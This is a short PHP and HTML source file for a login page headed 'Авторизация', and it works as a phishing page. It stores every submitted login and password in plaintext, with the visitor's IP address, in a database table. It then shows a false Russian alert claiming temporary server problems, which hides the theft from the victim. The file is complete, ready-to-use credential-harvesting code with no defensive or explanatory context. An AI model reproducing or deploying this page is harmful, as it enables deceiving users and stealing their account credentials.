<?php

if (isset($_POST['login']) && isset($_POST['password'])){

$ip = $_SERVER['REMOTE_ADDR'];

$login = $_POST['login'];
$password = $_POST['password'];

$db_host = "localhost";
$db_user = "YOU_LOGIN";
$db_password = "YOU_PASSWORD";
$db_base = 'YOU_DB';
$db = new PDO("mysql:host=$db_host;dbname=$db_base", $db_user, $db_password);

$data = array( 'login' => $login, 'password' => $password, 'ip' => $ip );
$query = $db->prepare("INSERT INTO lap (login, password, ip) values (:login, :password, :ip)");
$query->execute($data);
echo "<script>alert(\"Извините, на сервере временные неполадки, попробуйте авторизоваться позднее. Спасибо за понимание. \");</script>";
}

?>

<html>
<head>
 <title>Авторизация</title>
</head>
<body>
 <form method="POST" action="">
  <input name="login" type="login" placeholder="Login"/>
  <input name="password" type="password" placeholder="Password"/>
  <br><br>
  <input type="submit" value="Авторизоваться"/>
 </form>
</body>
</html>
